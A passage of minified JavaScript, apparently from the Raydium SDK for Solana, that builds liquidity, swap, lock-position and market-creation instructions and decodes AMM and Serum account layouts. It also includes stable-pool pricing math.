        return new vs({ keys: f, programId: t.programId, data: dt.from(uE) });
      }
      static harvestLockPositionInstructionV2({
        programId: t,
        auth: e,
        lockPositionId: n,
        clmmProgram: r,
        lockOwner: o,
        lockNftMint: i,
        lockNftAccount: s,
        positionNftAccount: a,
        positionId: u,
        poolId: c,
        protocolPosition: l,
        vaultA: d,
        vaultB: f,
        tickArrayLower: h,
        tickArrayUpper: p,
        userVaultA: m,
        userVaultB: g,
        mintA: y,
        mintB: w,
        rewardAccounts: b,
        exTickArrayBitmap: v,
      }) {
        let A = [
            ...(v ? [{ pubkey: v, isSigner: !1, isWritable: !0 }] : []),
            ...b
              .map((t) => [
                { pubkey: t.poolRewardVault, isSigner: !1, isWritable: !0 },
                { pubkey: t.ownerRewardVault, isSigner: !1, isWritable: !0 },
                { pubkey: t.rewardMint, isSigner: !1, isWritable: !1 },
              ])
              .flat(),
          ],
          k = [
            { pubkey: e, isSigner: !1, isWritable: !1 },
            { pubkey: o, isSigner: !0, isWritable: !1 },
            { pubkey: s, isSigner: !1, isWritable: !0 },
            { pubkey: n, isSigner: !1, isWritable: !1 },
            { pubkey: r, isSigner: !1, isWritable: !1 },
            { pubkey: a, isSigner: !1, isWritable: !0 },
            { pubkey: u, isSigner: !1, isWritable: !0 },
            { pubkey: c, isSigner: !1, isWritable: !0 },
            { pubkey: l, isSigner: !1, isWritable: !0 },
            { pubkey: d, isSigner: !1, isWritable: !0 },
            { pubkey: f, isSigner: !1, isWritable: !0 },
            { pubkey: h, isSigner: !1, isWritable: !0 },
            { pubkey: p, isSigner: !1, isWritable: !0 },
            { pubkey: m, isSigner: !1, isWritable: !0 },
            { pubkey: g, isSigner: !1, isWritable: !0 },
            { pubkey: Bc, isSigner: !1, isWritable: !1 },
            { pubkey: Cc, isSigner: !1, isWritable: !1 },
            { pubkey: zI, isSigner: !1, isWritable: !1 },
            { pubkey: y, isSigner: !1, isWritable: !1 },
            { pubkey: w, isSigner: !1, isWritable: !1 },
            ...A,
          ];
        return new vs({ keys: k, programId: t, data: dt.from(uE) });
      }
    };
  JT([
    qT("mintAuthorityOption"),
    jT("mintAuthority"),
    zT("supply"),
    UT("decimals"),
    UT("isInitialized"),
    qT("freezeAuthorityOption"),
    jT("freezeAuthority"),
  ]);
  var lE = (t) =>
      new XI({
        mint: t.address,
        decimals: t.decimals,
        symbol: t.symbol,
        name: t.name,
      }),
    dE = (t) => {
      var e = t,
        { amount: n, isRaw: r, name: o } = e,
        i = TA(e, ["amount", "isRaw", "name"]);
      return new OI(
        new XI({
          mint: HI(i.address).toBase58(),
          decimals: i.decimals,
          symbol: i.symbol,
          name: o,
        }),
        n,
        r,
        o
      );
    },
    fE = (t) => {
      var e = t,
        { address: n, programId: r, decimals: o } = e,
        i = TA(e, ["address", "programId", "decimals"]);
      return SA(
        {
          chainId: 101,
          address: HI(n).toBase58(),
          programId: r,
          logoURI: "",
          symbol: "",
          name: "",
          decimals: o,
          tags: [],
          extensions: i.extensions || {},
        },
        i
      );
    },
    hE = (t) =>
      t
        ? _A(SA({}, t), {
            transferFeeConfigAuthority: t.transferFeeConfigAuthority.toBase58(),
            withdrawWithheldAuthority: t.withdrawWithheldAuthority.toBase58(),
            withheldAmount: t.withheldAmount.toString(),
            olderTransferFee: _A(SA({}, t.olderTransferFee), {
              epoch: t.olderTransferFee.epoch.toString(),
              maximumFee: t.olderTransferFee.maximumFee.toString(),
            }),
            newerTransferFee: _A(SA({}, t.newerTransferFee), {
              epoch: t.newerTransferFee.epoch.toString(),
              maximumFee: t.newerTransferFee.maximumFee.toString(),
            }),
          })
        : void 0,
    pE = new Yn(25),
    mE = new Yn(1e4),
    gE = JT([UT("instruction"), zT("amountIn"), zT("minAmountOut")]),
    yE = JT([UT("instruction"), zT("maxAmountIn"), zT("amountOut")]);
  JT([UT("instruction"), UT("nonce")]),
    JT([UT("instruction"), UT("nonce"), zT("startTime")]);
  var wE = JT([
    zT("status"),
    zT("nonce"),
    zT("maxOrder"),
    zT("depth"),
    zT("baseDecimal"),
    zT("quoteDecimal"),
    zT("state"),
    zT("resetFlag"),
    zT("minSize"),
    zT("volMaxCutRatio"),
    zT("amountWaveRatio"),
    zT("baseLotSize"),
    zT("quoteLotSize"),
    zT("minPriceMultiplier"),
    zT("maxPriceMultiplier"),
    zT("systemDecimalValue"),
    zT("minSeparateNumerator"),
    zT("minSeparateDenominator"),
    zT("tradeFeeNumerator"),
    zT("tradeFeeDenominator"),
    zT("pnlNumerator"),
    zT("pnlDenominator"),
    zT("swapFeeNumerator"),
    zT("swapFeeDenominator"),
    zT("baseNeedTakePnl"),
    zT("quoteNeedTakePnl"),
    zT("quoteTotalPnl"),
    zT("baseTotalPnl"),
    zT("poolOpenTime"),
    zT("punishPcAmount"),
    zT("punishCoinAmount"),
    zT("orderbookToInitTime"),
    KT("swapBaseInAmount"),
    KT("swapQuoteOutAmount"),
    zT("swapBase2QuoteFee"),
    KT("swapQuoteInAmount"),
    KT("swapBaseOutAmount"),
    zT("swapQuote2BaseFee"),
    jT("baseVault"),
    jT("quoteVault"),
    jT("baseMint"),
    jT("quoteMint"),
    jT("lpMint"),
    jT("openOrders"),
    jT("marketId"),
    jT("marketProgramId"),
    jT("targetOrders"),
    jT("withdrawQueue"),
    jT("lpVault"),
    jT("owner"),
    zT("lpReserve"),
    YT(zT(), 3, "padding"),
  ]);
  JT([
    zT("accountType"),
    zT("status"),
    zT("nonce"),
    zT("maxOrder"),
    zT("depth"),
    zT("baseDecimal"),
    zT("quoteDecimal"),
    zT("state"),
    zT("resetFlag"),
    zT("minSize"),
    zT("volMaxCutRatio"),
    zT("amountWaveRatio"),
    zT("baseLotSize"),
    zT("quoteLotSize"),
    zT("minPriceMultiplier"),
    zT("maxPriceMultiplier"),
    zT("systemDecimalsValue"),
    zT("abortTradeFactor"),
    zT("priceTickMultiplier"),
    zT("priceTick"),
    zT("minSeparateNumerator"),
    zT("minSeparateDenominator"),
    zT("tradeFeeNumerator"),
    zT("tradeFeeDenominator"),
    zT("pnlNumerator"),
    zT("pnlDenominator"),
    zT("swapFeeNumerator"),
    zT("swapFeeDenominator"),
    zT("baseNeedTakePnl"),
    zT("quoteNeedTakePnl"),
    zT("quoteTotalPnl"),
    zT("baseTotalPnl"),
    zT("poolOpenTime"),
    zT("punishPcAmount"),
    zT("punishCoinAmount"),
    zT("orderbookToInitTime"),
    KT("swapBaseInAmount"),
    KT("swapQuoteOutAmount"),
    KT("swapQuoteInAmount"),
    KT("swapBaseOutAmount"),
    zT("swapQuote2BaseFee"),
    zT("swapBase2QuoteFee"),
    jT("baseVault"),
    jT("quoteVault"),
    jT("baseMint"),
    jT("quoteMint"),
    jT("lpMint"),
    jT("modelDataAccount"),
    jT("openOrders"),
    jT("marketId"),
    jT("marketProgramId"),
    jT("targetOrders"),
    jT("owner"),
    YT(zT(), 64, "padding"),
  ]);
  var bE = JT([
      UT("instruction"),
      zT("baseAmountIn"),
      zT("quoteAmountIn"),
      zT("fixedSide"),
      zT("otherAmountMin"),
    ]),
    vE = JT([
      UT("instruction"),
      zT("lpAmount"),
      zT("baseAmountMin"),
      zT("quoteAmountMin"),
    ]),
    AE = JT([zT("fee")]),
    kE = new Ji("CDSr3ssLcRB6XYPJwAfFt18MZvEZp4LjHcvzBVZ45duo"),
    IE = 5e4,
    SE = JT([zT("x"), zT("y"), zT("price")]),
    _E = JT([
      zT("accountType"),
      zT("status"),
      zT("multiplier"),
      zT("validDataCount"),
      YT(SE, IE, "DataElement"),
    ]);
  function TE(t, e, n) {
    let [r, o] = [0, IE - 2],
      i = r,
      s = o,
      a = 0,
      u = (e * t.multiplier) / n;
    for (; i <= s; ) {
      if (((a = Math.floor((s + i) / 2)), 0 === a || a >= IE - 2))
        return [a, a, !1];
      let e = (t.DataElement[a].x * t.multiplier) / t.DataElement[a].y,
        n = (t.DataElement[a - 1].x * t.multiplier) / t.DataElement[a - 1].y,
        r = (t.DataElement[a + 1].x * t.multiplier) / t.DataElement[a + 1].y;
      if (u === e) return [a, a, !0];
      if (u === n) return [a - 1, a - 1, !0];
      if (u === r) return [a + 1, a + 1, !0];
      if (u < n) s = a - 1;
      else {
        if (u > n && u < e) return [a - 1, a, !0];
        if (u > e && u < r) return [a, a + 1, !0];
        i = a + 1;
      }
    }
    return [a, a, !1];
  }
  function BE(t, e, n) {
    let [r, o, i] = TE(t, e, n);
    if (!i) return 0;
    if (r === o) {
      let n = t.DataElement[r].x;
      return (e * t.multiplier) / n;
    }
    {
      let i = t.DataElement[r].x,
        s = t.DataElement[r].y,
        a = t.DataElement[o].x,
        u = t.DataElement[o].y,
        c = n * (a * s - i * u),
        l = i * c + (a - i) * (e * s - i * n) * u;
      return (e * t.multiplier * c) / l;
    }
  }
  function CE(t, e, n) {
    return (e * t.multiplier) / n;
  }
  function EE(t, e, n) {
    return (e * n) / t.multiplier;
  }
  function xE(t, e) {
    let [n, r] = [0, IE - 2],
      o = n,
      i = r,
      s = 0,
      a = e;
    for (; o < i; ) {
      if (((s = Math.floor((i + o) / 2)), s <= 0 || s > IE - 2))
        return [s, s, !1];
      let e = t.DataElement[s].x,
        n = t.DataElement[s - 1].x,
        r = t.DataElement[s + 1].x;
      if (a === e) return [s, s, !0];
      if (a === n) return [s - 1, s - 1, !0];
      if (a === r) return [s + 1, s + 1, !0];
      if (a < n) i = s - 1;
      else {
        if (a > n && a < e) return [s - 1, s, !0];
        if (a > e && a < r) return [s, s + 1, !0];
        o = s + 1;
      }
    }
    return [s, s, !1];
  }
  function PE(t, e) {
    let [n, r] = [0, IE - 2],
      o = n,
      i = r,
      s = 0,
      a = e;
    for (; o <= i; ) {
      if (((s = Math.floor((i + o) / 2)), s <= 0 || s >= IE - 2))
        return [s, s, !1];
      let e = t.DataElement[s].y,
        n = t.DataElement[s - 1].y,
        r = t.DataElement[s + 1].y;
      if (a === e) return [s, s, !0];
      if (a === n) return [s - 1, s - 1, !0];
      if (a === r) return [s + 1, s + 1, !0];
      if (a < r) o = s + 1;
      else {
        if (a < n && a > e) return [s - 1, s, !0];
        if (a < e && a > r) return [s, s + 1, !0];
        i = s - 1;
      }
    }
    return [s, s, !1];
  }
  function OE(t, e, n, r) {
    let o = r ? e + n : e - n,
      [i, s, a] = xE(t, o);
    if (!a) return [0, 0, !1, a];
    if (i === s) return [t.DataElement[s].price, t.DataElement[s].y, !1, a];
    {
      let n = t.DataElement[i].x,
        u = t.DataElement[s].x,
        c = t.DataElement[i].price,
        l = t.DataElement[s].price,
        d = t.DataElement[i].y,
        f = t.DataElement[s].y;
      if (e >= n && e <= u) return r ? [l, f, !0, a] : [c, d, !0, a];
      {
        let i, s;
        return (
          r
            ? ((i = c + ((l - c) * (e - n)) / (u - n)),
              (s = d - ((o - n) * t.multiplier) / l))
            : ((i = c + ((l - c) * (e - n)) / (u - n)),
              (s = f + ((u - o) * t.multiplier) / c)),
          [i, s, !1, a]
        );
      }
    }
  }
  function RE(t, e, n, r) {
    let o = BE(t, e, n),
      i = CE(t, e, o),
      s = CE(t, n, o),
      a = CE(t, r, o),
      [u, c, l, d] = (function (t, e, n) {
        let r = e + n,
          [o, i, s] = PE(t, r);
        if (!s) return [0, 0, !1, s];
        if (o === i) return [t.DataElement[i].price, t.DataElement[i].x, !1, s];
        {
          let n = t.DataElement[o].x,
            a = t.DataElement[i].x,
            u = t.DataElement[o].price,
            c = t.DataElement[i].price,
            l = t.DataElement[o].y,
            d = t.DataElement[i].y;
          if (e >= d && e <= l) return [u, n, !0, s];
          {
            let n, o;
            return (
              (n = u + ((c - u) * (l - e)) / (l - d)),
              (o = a - (u * (r - d)) / t.multiplier),
              [n, o, !1, s]
            );
          }
        }
      })(t, s, a);
    if (!d) return 0;
    if (l) return (r * u) / t.multiplier;
    return EE(t, i - c, o);
  }
  function ME(t, e, n, r) {
    let o =
      (function (t, e) {
        let n = OE(t, e, 0, !1);
        return n[3] ? n[0] : 0;
      })(t, CE(t, e, BE(t, e, n))) / t.multiplier;
    return 1 / o;
  }
  var LE = class {
      constructor({ connection: t }) {
        (this._layoutData = {
          accountType: 0,
          status: 0,
          multiplier: 0,
          validDataCount: 0,
          DataElement: [],
        }),
          (this.connection = t);
      }
      get stableModelData() {
        return this._layoutData;
      }
      async initStableModelLayout() {
        if (0 === this._layoutData.validDataCount && this.connection) {
          let t = await this.connection.getAccountInfo(kE);
          t &&
            (this._layoutData = (function (t) {
              let e = _E.decode(t);
              return {
                accountType: e.accountType.toNumber(),
                status: e.status.toNumber(),
                multiplier: e.multiplier.toNumber(),
                validDataCount: e.validDataCount.toNumber(),
                DataElement: e.DataElement.map((t) => ({
                  x: t.x.toNumber(),
                  y: t.y.toNumber(),
                  price: t.price.toNumber(),
                })),
              };
            })(null == t ? void 0 : t.data));
        }
      }
    },
    NE = PA("Raydium_liquidity_instruction");
  function DE(t) {
    let {
        poolInfo: e,
        poolKeys: n,
        userKeys: r,
        baseAmountIn: o,
        quoteAmountIn: i,
        fixedSide: s,
        otherAmountMin: a,
      } = t,
      u = dt.alloc(bE.span);
    bE.encode(
      {
        instruction: 3,
        baseAmountIn: II(o),
        quoteAmountIn: II(i),
        otherAmountMin: II(a),
        fixedSide: "base" === s ? nS : rS,
      },
      u
    );
    let c = [
      LI({ pubkey: Bc, isWritable: !1 }),
      LI({ pubkey: new Ji(e.id) }),
      LI({ pubkey: new Ji(n.authority), isWritable: !1 }),
      LI({ pubkey: new Ji(n.openOrders), isWritable: !1 }),
      LI({ pubkey: new Ji(n.targetOrders) }),
      LI({ pubkey: new Ji(e.lpMint.address) }),
      LI({ pubkey: new Ji(n.vault.A) }),
      LI({ pubkey: new Ji(n.vault.B) }),
    ];
    return (
      e.pooltype.includes("StablePool") && c.push(LI({ pubkey: kE })),
      c.push(
        LI({ pubkey: new Ji(e.marketId), isWritable: !1 }),
        LI({ pubkey: r.baseTokenAccount }),
        LI({ pubkey: r.quoteTokenAccount }),
        LI({ pubkey: r.lpTokenAccount }),
        LI({ pubkey: r.owner, isWritable: !1, isSigner: !0 }),
        LI({ pubkey: new Ji(n.marketEventQueue), isWritable: !1 })
      ),
      new vs({ programId: new Ji(e.programId), keys: c, data: u })
    );
  }
  function UE(t) {
    let {
        poolInfo: e,
        poolKeys: n,
        userKeys: r,
        lpAmount: o,
        baseAmountMin: i,
        quoteAmountMin: s,
      } = t,
      a = eS(n),
      u = 4;
    if ((e.pooltype.includes("StablePool") && (u = 5), 4 === u || 5 === u)) {
      let t = dt.alloc(vE.span);
      vE.encode(
        {
          instruction: 4,
          lpAmount: II(o),
          baseAmountMin: II(i),
          quoteAmountMin: II(s),
        },
        t
      );
      let e = [
        LI({ pubkey: Bc, isWritable: !1 }),
        LI({ pubkey: a.id }),
        LI({ pubkey: a.authority, isWritable: !1 }),
        LI({ pubkey: a.openOrders }),
        LI({ pubkey: a.targetOrders }),
        LI({ pubkey: a.mintLp.address }),
        LI({ pubkey: a.vault.A }),
        LI({ pubkey: a.vault.B }),
      ];
      return (
        5 === u
          ? e.push(LI({ pubkey: kE }))
          : (e.push(LI({ pubkey: a.id })), e.push(LI({ pubkey: a.id }))),
        e.push(
          LI({ pubkey: a.marketProgramId, isWritable: !1 }),
          LI({ pubkey: a.marketId }),
          LI({ pubkey: a.marketBaseVault }),
          LI({ pubkey: a.marketQuoteVault }),
          LI({ pubkey: a.marketAuthority, isWritable: !1 }),
          LI({ pubkey: r.lpTokenAccount }),
          LI({ pubkey: r.baseTokenAccount }),
          LI({ pubkey: r.quoteTokenAccount }),
          LI({ pubkey: r.owner, isWritable: !1, isSigner: !0 }),
          LI({ pubkey: a.marketEventQueue }),
          LI({ pubkey: a.marketBids }),
          LI({ pubkey: a.marketAsks })
        ),
        new vs({ programId: a.programId, keys: e, data: t })
      );
    }
    return new vs({ programId: a.programId, keys: [] });
  }
  function qE({
    programId: t,
    ammId: e,
    ammAuthority: n,
    ammOpenOrders: r,
    lpMint: o,
    coinMint: i,
    pcMint: s,
    coinVault: a,
    pcVault: u,
    withdrawQueue: c,
    ammTargetOrders: l,
    poolTempLp: d,
    marketProgramId: f,
    marketId: h,
    userWallet: p,
    userCoinVault: m,
    userPcVault: g,
    userLpVault: y,
    nonce: w,
    openTime: b,
    coinAmount: v,
    pcAmount: A,
    ammConfigId: k,
    feeDestinationId: I,
  }) {
    let S = JT([
        UT("instruction"),
        UT("nonce"),
        zT("openTime"),
        zT("pcAmount"),
        zT("coinAmount"),
      ]),
      _ = [
        { pubkey: Bc, isSigner: !1, isWritable: !1 },
        { pubkey: Ec, isSigner: !1, isWritable: !1 },
        { pubkey: Gs.programId, isSigner: !1, isWritable: !1 },
        { pubkey: KI, isSigner: !1, isWritable: !1 },
        { pubkey: e, isSigner: !1, isWritable: !0 },
        { pubkey: n, isSigner: !1, isWritable: !1 },
        { pubkey: r, isSigner: !1, isWritable: !0 },
        { pubkey: o, isSigner: !1, isWritable: !0 },
        { pubkey: i, isSigner: !1, isWritable: !1 },
        { pubkey: s, isSigner: !1, isWritable: !1 },
        { pubkey: a, isSigner: !1, isWritable: !0 },
        { pubkey: u, isSigner: !1, isWritable: !0 },
        { pubkey: l, isSigner: !1, isWritable: !0 },
        { pubkey: k, isSigner: !1, isWritable: !1 },
        { pubkey: I, isSigner: !1, isWritable: !0 },
        { pubkey: f, isSigner: !1, isWritable: !1 },
        { pubkey: h, isSigner: !1, isWritable: !1 },
        { pubkey: p, isSigner: !0, isWritable: !0 },
        { pubkey: m, isSigner: !1, isWritable: !0 },
        { pubkey: g, isSigner: !1, isWritable: !0 },
        { pubkey: y, isSigner: !1, isWritable: !0 },
      ],
      T = dt.alloc(S.span);
    return (
      S.encode(
        { instruction: 1, nonce: w, openTime: b, coinAmount: v, pcAmount: A },
        T
      ),
      {
        instruction: new vs({ keys: _, programId: t, data: T }),
        instructionType: NS,
      }
    );
  }
  function zE(t) {
    let {
      poolKeys: e,
      version: n,
      userKeys: r,
      amountIn: o,
      amountOut: i,
      fixedSide: s,
    } = t;
    if (4 === n || 5 === n) {
      let a = { poolKeys: e, userKeys: r };
      if ("in" === s)
        return (function (
          { poolKeys: t, userKeys: e, amountIn: n, minAmountOut: r },
          o
        ) {
          let i = eS(t),
            s = dt.alloc(gE.span);
          gE.encode(
            { instruction: 9, amountIn: II(n), minAmountOut: II(r) },
            s
          );
          let a = [
            LI({ pubkey: Bc, isWritable: !1 }),
            LI({ pubkey: i.id }),
            LI({ pubkey: i.authority, isWritable: !1 }),
            LI({ pubkey: i.openOrders }),
          ];
          return (
            4 === o && a.push(LI({ pubkey: i.targetOrders })),
            a.push(LI({ pubkey: i.vault.A }), LI({ pubkey: i.vault.B })),
            5 === o && a.push(LI({ pubkey: kE })),
            a.push(
              LI({ pubkey: i.marketProgramId, isWritable: !1 }),
              LI({ pubkey: i.marketId }),
              LI({ pubkey: i.marketBids }),
              LI({ pubkey: i.marketAsks }),
              LI({ pubkey: i.marketEventQueue }),
              LI({ pubkey: i.marketBaseVault }),
              LI({ pubkey: i.marketQuoteVault }),
              LI({ pubkey: i.marketAuthority, isWritable: !1 }),
              LI({ pubkey: e.tokenAccountIn }),
              LI({ pubkey: e.tokenAccountOut }),
              LI({ pubkey: e.owner, isWritable: !1, isSigner: !0 })
            ),
            new vs({ programId: i.programId, keys: a, data: s })
          );
        })(_A(SA({}, a), { amountIn: o, minAmountOut: i }), n);
      if ("out" === s)
        return (function (
          { poolKeys: t, userKeys: e, maxAmountIn: n, amountOut: r },
          o
        ) {
          let i = eS(t),
            s = dt.alloc(yE.span);
          yE.encode(
            { instruction: 11, maxAmountIn: II(n), amountOut: II(r) },
            s
          );
          let a = [
            LI({ pubkey: Bc, isWritable: !1 }),
            LI({ pubkey: i.id }),
            LI({ pubkey: i.authority, isWritable: !1 }),
            LI({ pubkey: i.openOrders }),
            LI({ pubkey: i.targetOrders }),
            LI({ pubkey: i.vault.A }),
            LI({ pubkey: i.vault.B }),
          ];
          return (
            5 === o && a.push(LI({ pubkey: kE })),
            a.push(
              LI({ pubkey: i.marketProgramId, isWritable: !1 }),
              LI({ pubkey: i.marketId }),
              LI({ pubkey: i.marketBids }),
              LI({ pubkey: i.marketAsks }),
              LI({ pubkey: i.marketEventQueue }),
              LI({ pubkey: i.marketBaseVault }),
              LI({ pubkey: i.marketQuoteVault }),
              LI({ pubkey: i.marketAuthority, isWritable: !1 }),
              LI({ pubkey: e.tokenAccountIn }),
              LI({ pubkey: e.tokenAccountOut }),
              LI({ pubkey: e.owner, isWritable: !1, isSigner: !0 })
            ),
            new vs({ programId: i.programId, keys: a, data: s })
          );
        })(_A(SA({}, a), { maxAmountIn: o, amountOut: i }), n);
      NE.logWithError("invalid params", "params", t);
    }
    throw (
      (NE.logWithError("invalid version", "poolKeys.version", n),
      new Error("invalid version"))
    );
  }
  var KE = PA("Raydium_liquidity_serum");
  function WE({ programId: t }) {
    let { publicKey: e } = f_([dt.from("amm_config_account_seed", "utf-8")], t);
    return e;
  }
  function FE({ name: t, programId: e, marketId: n }) {
    let { publicKey: r } = f_(
      [e.toBuffer(), n.toBuffer(), dt.from(t, "utf-8")],
      e
    );
    return r;
  }
  function jE({ programId: t }) {
    return f_(
      [dt.from([97, 109, 109, 32, 97, 117, 116, 104, 111, 114, 105, 116, 121])],
      t
    );
  }
  function GE({
    version: t,
    marketVersion: e,
    marketId: n,
    baseMint: r,
    quoteMint: o,
    baseDecimals: i,
    quoteDecimals: s,
    programId: a,
    marketProgramId: u,
  }) {
    let c = FE({ name: "amm_associated_seed", programId: a, marketId: n }),
      l = FE({ name: "lp_mint_associated_seed", programId: a, marketId: n }),
      { publicKey: d, nonce: f } = jE({ programId: a }),
      h = FE({ name: "coin_vault_associated_seed", programId: a, marketId: n }),
      p = FE({ name: "pc_vault_associated_seed", programId: a, marketId: n }),
      m = FE({
        name: "temp_lp_token_associated_seed",
        programId: a,
        marketId: n,
      }),
      g = (function ({ programId: t, marketId: e }) {
        let { publicKey: n } = f_(
          [
            t.toBuffer(),
            e.toBuffer(),
            dt.from("open_order_associated_seed", "utf-8"),
          ],
          t
        );
        return n;
      })({ programId: a, marketId: n }),
      y = FE({ name: "target_associated_seed", programId: a, marketId: n }),
      w = FE({ name: "withdraw_associated_seed", programId: a, marketId: n }),
      { publicKey: b } = (function ({ programId: t, marketId: e }) {
        let n,
          r = [e.toBuffer()],
          o = 0;
        for (; o < 100; ) {
          try {
            let e = r.concat(dt.from([o]), dt.alloc(7));
            n = Ji.createProgramAddressSync(e, t);
          } catch (i) {
            if (i instanceof TypeError) throw i;
            o++;
            continue;
          }
          return { publicKey: n, nonce: o };
        }
        throw (
          (KE.logWithError(
            "unable to find a viable program address nonce",
            "params",
            { programId: t, marketId: e }
          ),
          new Error("unable to find a viable program address nonce"))
        );
      })({ programId: u, marketId: n });
    return {
      id: c,
      baseMint: r,
      quoteMint: o,
      lpMint: l,
      baseDecimals: i,
      quoteDecimals: s,
      lpDecimals: i,
      version: t,
      programId: a,
      authority: d,
      nonce: f,
      baseVault: h,
      quoteVault: p,
      lpVault: m,
      openOrders: g,
      targetOrders: y,
      withdrawQueue: w,
      marketVersion: e,
      marketProgramId: u,
      marketId: n,
      marketAuthority: b,
      lookupTableAccount: Ji.default,
      configId: WE({ programId: a }),
    };
  }
  var VE = {
      volume: 0,
      volumeQuote: 0,
      volumeFee: 0,
      apr: 0,
      feeApr: 0,
      priceMin: 0,
      priceMax: 0,
      rewardApr: [],
    },
    HE = (t) => {
      let e = {},
        n = Bc.toBase58();
      return (
        Object.keys(t).map((r) => {
          let o = t[r],
            [i, s] = [o.baseMint.toBase58(), o.quoteMint.toBase58()];
          e[r] = {
            id: r,
            version: 4,
            status: o.status.toNumber(),
            programId: o.programId.toBase58(),
            mintA: fE({
              address: i,
              programId: n,
              decimals: o.baseDecimal.toNumber(),
            }),
            mintB: fE({
              address: s,
              programId: n,
              decimals: o.quoteDecimal.toNumber(),
            }),
            rewardDefaultInfos: [],
            rewardDefaultPoolInfos: "Ecosystem",
            price: o.poolPrice.toNumber(),
            mintAmountA: new bI(o.mintAAmount.toString())
              .div(10 ** o.baseDecimal.toNumber())
              .toNumber(),
            mintAmountB: new bI(o.mintBAmount.toString())
              .div(10 ** o.quoteDecimal.toNumber())
              .toNumber(),
            baseReserve: o.baseReserve,
            quoteReserve: o.quoteReserve,
            feeRate: new bI(o.tradeFeeNumerator.toString())
              .div(o.tradeFeeDenominator.toString())
              .toNumber(),
            openTime: o.poolOpenTime.toString(),
            tvl: 0,
            day: VE,
            week: VE,
            month: VE,
            pooltype: [],
            farmUpcomingCount: 0,
            farmOngoingCount: 0,
            farmFinishedCount: 0,
            type: "Standard",
            marketId: o.marketId.toBase58(),
            configId: WE({ programId: o.programId }).toBase58(),
            lpPrice: 0,
            lpAmount: new bI(o.lpReserve.toString())
              .div(
                10 **
                  Math.min(o.baseDecimal.toNumber(), o.quoteDecimal.toNumber())
              )
              .toNumber(),
            lpMint: fE({
              address: o.lpMint.toBase58(),
              programId: n,
              decimals: Math.min(
                o.baseDecimal.toNumber(),
                o.quoteDecimal.toNumber()
              ),
            }),
            burnPercent: 0,
          };
        }),
        e
      );
    };
  var ZE = JT([
    RT(5),
    (function (t = "accountFlags") {
      let e = new DT(t);
      return (
        e.addBoolean("initialized"),
        e.addBoolean("market"),
        e.addBoolean("openOrders"),
        e.addBoolean("requestQueue"),
        e.addBoolean("eventQueue"),
        e.addBoolean("bids"),
        e.addBoolean("asks"),
        e
      );
    })("accountFlags"),
    jT("ownAddress"),
    zT("vaultSignerNonce"),
    jT("baseMint"),
    jT("quoteMint"),
    jT("baseVault"),
    zT("baseDepositsTotal"),
    zT("baseFeesAccrued"),
    jT("quoteVault"),
    zT("quoteDepositsTotal"),
    zT("quoteFeesAccrued"),
    zT("quoteDustThreshold"),
    jT("requestQueue"),
    jT("eventQueue"),
    jT("bids"),
    jT("asks"),
    zT("baseLotSize"),
    zT("quoteLotSize"),
    zT("feeRateBps"),
    zT("referrerRebatesAccrued"),
    RT(7),
  ]);
  async function XE({ connection: t, wallet: e, marketInfo: n }) {
    var r, o, i, s, a, u, c, l;
    let d = new As(),
      f = await t.getMinimumBalanceForRentExemption(165);
    d.add(
      Gs.createAccountWithSeed({
        fromPubkey: e,
        basePubkey: e,
        seed: n.baseVault.seed,
        newAccountPubkey: n.baseVault.publicKey,
        lamports: f,
        space: 165,
        programId: Bc,
      }),
      Gs.createAccountWithSeed({
        fromPubkey: e,
        basePubkey: e,
        seed: n.quoteVault.seed,
        newAccountPubkey: n.quoteVault.publicKey,
        lamports: f,
        space: 165,
        programId: Bc,
      }),
      bl(n.baseVault.publicKey, n.baseMint, n.vaultOwner),
      bl(n.quoteVault.publicKey, n.quoteMint, n.vaultOwner),
      Gs.createAccountWithSeed({
        fromPubkey: e,
        basePubkey: e,
        seed: n.id.seed,
        newAccountPubkey: n.id.publicKey,
        lamports: await t.getMinimumBalanceForRentExemption(ZE.span),
        space: ZE.span,
        programId: n.programId,
      })
    );
    let h = new As();
    return (
      h.add(
        Gs.createAccountWithSeed({
          fromPubkey: e,
          basePubkey: e,
          seed: n.requestQueue.seed,
          newAccountPubkey: n.requestQueue.publicKey,
          lamports: n.lowestFeeMarket
            ? 6208320
            : await t.getMinimumBalanceForRentExemption(
                null != (r = n.requestQueueSpace) ? r : 5132
              ),
          space: n.lowestFeeMarket
            ? 764
            : null != (o = n.requestQueueSpace)
            ? o
            : 5132,
          programId: n.programId,
        }),
        Gs.createAccountWithSeed({
          fromPubkey: e,
          basePubkey: e,
          seed: n.eventQueue.seed,
          newAccountPubkey: n.eventQueue.publicKey,
          lamports: n.lowestFeeMarket
            ? 79594560
            : await t.getMinimumBalanceForRentExemption(
                null != (i = n.eventQueueSpace) ? i : 262156
              ),
          space: n.lowestFeeMarket
            ? 11308
            : null != (s = n.eventQueueSpace)
            ? s
            : 262156,
          programId: n.programId,
        }),
        Gs.createAccountWithSeed({
          fromPubkey: e,
          basePubkey: e,
          seed: n.bids.seed,
          newAccountPubkey: n.bids.publicKey,
          lamports: n.lowestFeeMarket
            ? 101977920
            : await t.getMinimumBalanceForRentExemption(
                null != (a = n.orderbookQueueSpace) ? a : 65548
              ),
          space: n.lowestFeeMarket
            ? 14524
            : null != (u = n.orderbookQueueSpace)
            ? u
            : 65548,
          programId: n.programId,
        }),
        Gs.createAccountWithSeed({
          fromPubkey: e,
          basePubkey: e,
          seed: n.asks.seed,
          newAccountPubkey: n.asks.publicKey,
          lamports: n.lowestFeeMarket
            ? 101977920
            : await t.getMinimumBalanceForRentExemption(
                null != (c = n.orderbookQueueSpace) ? c : 65548
              ),
          space: n.lowestFeeMarket
            ? 14524
            : null != (l = n.orderbookQueueSpace)
            ? l
            : 65548,
          programId: n.programId,
        }),
        (function ({ programId: t, marketInfo: e }) {
          let n = JT([
              UT("version"),
              qT("instruction"),
              zT("baseLotSize"),
              zT("quoteLotSize"),
              CT("feeRateBps"),
              zT("vaultSignerNonce"),
              zT("quoteDustThreshold"),
            ]),
            r = [
              { pubkey: e.id, isSigner: !1, isWritable: !0 },
              { pubkey: e.requestQueue, isSigner: !1, isWritable: !0 },
              { pubkey: e.eventQueue, isSigner: !1, isWritable: !0 },
              { pubkey: e.bids, isSigner: !1, isWritable: !0 },
              { pubkey: e.asks, isSigner: !1, isWritable: !0 },
              { pubkey: e.baseVault, isSigner: !1, isWritable: !0 },
              { pubkey: e.quoteVault, isSigner: !1, isWritable: !0 },
              { pubkey: e.baseMint, isSigner: !1, isWritable: !1 },
              { pubkey: e.quoteMint, isSigner: !1, isWritable: !1 },
              {
                pubkey: e.authority ? e.quoteMint : Cs,
                isSigner: !1,
                isWritable: !1,
              },
            ]
              .concat(
                e.authority
